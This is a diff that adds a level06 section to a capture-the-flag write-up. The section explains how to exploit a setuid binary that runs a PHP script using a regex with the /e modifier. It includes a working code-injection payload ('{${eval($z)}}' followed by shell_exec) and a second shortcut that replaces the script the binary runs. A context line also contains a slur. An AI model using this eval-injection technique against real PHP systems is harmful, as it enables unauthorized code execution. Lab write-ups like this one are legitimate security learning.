@@ -189,3 +189,48 @@ END
 # wait for the flag file to appear (or just spam `cat /tmp/flag` like a retard)
 while [ ! -f /tmp/flag ]; do sleep 1; done; cat /tmp/flag
 ```
+
+## Breaking out of PHP regex hell (level06)
+
+The level06 is a setuid binary that takes two arguments and passes them to an
+overly convoluted php script that is executes. It has a regex with the '\e'
+option, which means it evaluates the code inside it as php code and executes it.
+So this is our obvious way in. The less obvious thing is to find what the
+arguments are to exploit the script.
+
+The first argument must be a file since the `file_get_contents` function is
+called on it. The second one is a string of php code that will be executed if
+the contents of the file do match the '\e' regex.
+
+```shell
+# set the file to match the regex
+cat << END > /tmp/hell_regex_match
+[x {${eval($z)}}]
+END
+# call the binary with the file and the code to execute
+./level06 /tmp/hell_regex_match 'shell_exec("getflag > /tmp/flag");'
+# get the flag
+cat /tmp/flag
+```
+
+Although, there is a way simpler solution. By default, when logging in with a
+user, the home does not have write permissions on. However, since the user
+obviously owns its home directory he can change that. This means we can delete
+the orginal file and replace it with our own:
+
+```shell
+# change directory permissions
+chmod 755 .
+# delete annoying php script
+rm level06.php
+# replace it by what we want to execute
+cat << END > level06.php
+<?php
+shell_exec("getflag > /tmp/flag");
+?>
+END
+# run the script through the binary
+./level06
+# get the flag
+cat /tmp/flag
+```
